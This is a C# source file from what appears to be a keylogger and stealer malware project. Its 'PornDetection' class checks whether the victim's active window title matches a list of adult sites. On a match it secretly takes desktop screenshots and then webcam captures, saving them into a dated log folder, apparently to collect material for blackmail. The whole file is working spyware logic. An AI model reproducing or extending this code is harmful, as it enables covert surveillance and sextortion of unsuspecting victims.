using System;
using System.IO;
using System.Threading;
using RFStub;
using Stealer;

namespace Keylogger;

internal sealed class PornDetection
{
	private static string LogDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\nsfw\\" + DateTime.Now.ToString("yyyy-MM-dd"));

	public static void Action()
	{
		if (Detect())
		{
			SendPhotos();
		}
	}

	private static bool Detect()
	{
		string[] pornServices = Config.PornServices;
		int num = 0;
		while (true)
		{
			if (num < pornServices.Length)
			{
				string value = pornServices[num];
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void SendPhotos()
	{
		string text = LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		Thread.Sleep(3000);
		DesktopScreenshot.Make(text);
		Thread.Sleep(12000);
		if (Detect())
		{
			WebcamScreenshot.Make(text);
		}
	}
}
